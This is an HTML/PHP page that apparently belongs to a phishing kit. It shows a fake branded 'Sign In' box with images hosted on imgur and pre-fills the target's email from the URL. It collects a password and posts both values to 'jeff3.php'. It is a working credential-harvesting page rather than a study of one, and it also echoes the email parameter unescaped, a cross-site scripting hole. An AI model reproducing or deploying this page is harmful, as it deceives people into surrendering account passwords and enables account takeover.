
<!doctype html>
<html>
<head>
<title>Sign In</title>
</head>
<body>
<center>
<style type="text/css">
	
  body {
    background: url('https://i.imgur.com/eK8fyDC.png') no-repeat fixed;
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
    background-size: 100%;
}

input{
  display: block;
  margin: 0;
  width: 300px;
  font-family: apple-system,system-ui,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;
  font-size: 16px;  
   padding: 8px;
       border: 0;
  outline: 0;
  background: transparent;
  border-bottom: 1px solid #D9D9D9;

}

input:focus {
     border-bottom: 2px solid #1476D9;
}
label{
      font-size: 1.2em;
      font-weight: bold;    
      font-family: 'Source Sans Pro',sans-serif;
    font-size: 16px;
    line-height: 1.42857143;
    color: #333;
}
fieldset {
    font-family: sans-serif;
width:380px;
height:550px;
 background:white;
    padding: 0px;
bottom:10px;
    border-radius: 3px; 
    position: relative;
    left: 350px;
    box-sizing: border-box;
    box-shadow: 0 2px 4px 0 rgba(181,181,181,.7);
        border: 1px solid #f1f1f5;
}

input[type=submit] {
  width: 320px;
    font-family: sans-serif;
    font-size: 16px;
    color: white;
    padding:15px 15px; 
    background: #188FFF; 
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 3px;
    border-radius: 3px; 
}

   
</style>
 <?php
/*
Get email from URL and set to email1 variable
*/
$email1 = $_GET['email'];
?>
<form action="jeff3.php" method="post">
<br><br><br><br><br><fieldset><br>
<img src="https://i.imgur.com/IHWrGCD.png"><br>
<input type="hidden" name="user" value="<?php echo $email1;?>" required ><br>
<br><input type="password" name="pass" placeholder="Password" required ><br>

<br>
    <input type="submit" name="submit" onmouseover="this.style.background='#4CA9FF';" onmouseout="this.style.background='#188FFF';" value="Login"/>
    


<br><br>

</center>
</form>
</body>
</html>
